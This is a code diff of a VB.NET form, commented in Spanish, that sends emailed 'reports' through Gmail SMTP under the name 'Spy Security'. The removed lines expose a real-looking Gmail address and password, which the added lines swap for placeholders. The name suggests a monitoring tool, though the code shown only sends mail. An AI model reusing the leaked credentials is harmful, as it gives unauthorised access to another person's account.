@@ -262,14 +262,14 @@ Public Class Form1
                     Dim _SMTP As New System.Net.Mail.SmtpClient
 
                     'CONFIGURACIÓN DEL STMP
-                    _SMTP.Credentials = New System.Net.NetworkCredential("kevinmolinataylor@gmail.com", "developers:$group789")
+                                        _SMTP.Credentials = New System.Net.NetworkCredential("TU EMAIL", "TU PASSWORD")
                     _SMTP.Host = "smtp.gmail.com"
                     _SMTP.Port = 587
                     _SMTP.EnableSsl = True
 
                     ' CONFIGURACION DEL MENSAJE
                     _Message.[To].Add(Me.ToolStripTextBox1.Text.ToString) 'Cuenta de Correo al que se le quiere enviar el e-mail
-                    _Message.From = New System.Net.Mail.MailAddress("kevinmolinataylor@gmail.com", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
+                    _Message.From = New System.Net.Mail.MailAddress("TU EMAIL", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
                     _Message.Subject = Me.ToolStripMenuItem1.Text.ToString 'Sujeto del e-mail
                     _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
                     _Message.Body = con 'contenido del mail
@@ -403,14 +403,14 @@ Public Class Form1
             Dim _SMTP As New System.Net.Mail.SmtpClient
 
             'CONFIGURACIÓN DEL STMP
-            _SMTP.Credentials = New System.Net.NetworkCredential("kevinmolinataylor@gmail.com", "developers:$group789")
+                                _SMTP.Credentials = New System.Net.NetworkCredential("TU EMAIL", "Tu PASS")
             _SMTP.Host = "smtp.gmail.com"
             _SMTP.Port = 587
             _SMTP.EnableSsl = True
 
             ' CONFIGURACION DEL MENSAJE
             _Message.[To].Add(Me.ToolStripTextBox1.Text.ToString) 'Cuenta de Correo al que se le quiere enviar el e-mail
-            _Message.From = New System.Net.Mail.MailAddress("kevinmolinataylor@gmail.com", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
+            _Message.From = New System.Net.Mail.MailAddress("TU EMAIL", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
             _Message.Subject = Me.ToolStripMenuItem1.Text.ToString 'Sujeto del e-mail
             _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
             _Message.Body = con 'contenido del mail
@@ -539,14 +539,14 @@ Public Class Form1
                     Dim _SMTP As New System.Net.Mail.SmtpClient
 
                     'CONFIGURACIÓN DEL STMP
-                    _SMTP.Credentials = New System.Net.NetworkCredential("kevinmolinataylor@gmail.com", "developers:$group789")
+                            _SMTP.Credentials = New System.Net.NetworkCredential("TU EMAIL", "PASSWORD")
                     _SMTP.Host = "smtp.gmail.com"
                     _SMTP.Port = 587
                     _SMTP.EnableSsl = True
 
                     ' CONFIGURACION DEL MENSAJE
                     _Message.[To].Add(Me.ToolStripTextBox1.Text.ToString) 'Cuenta de Correo al que se le quiere enviar el e-mail
-                    _Message.From = New System.Net.Mail.MailAddress("kevinmolinataylor@gmail.com", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
+                    _Message.From = New System.Net.Mail.MailAddress("TU EMAIL", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
                     _Message.Subject = "Spy Security - Reportes DATA" 'Sujeto del e-mail
                     _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
                     _Message.Body = Me.RichTextBox1.Text.ToString 'contenido del mail
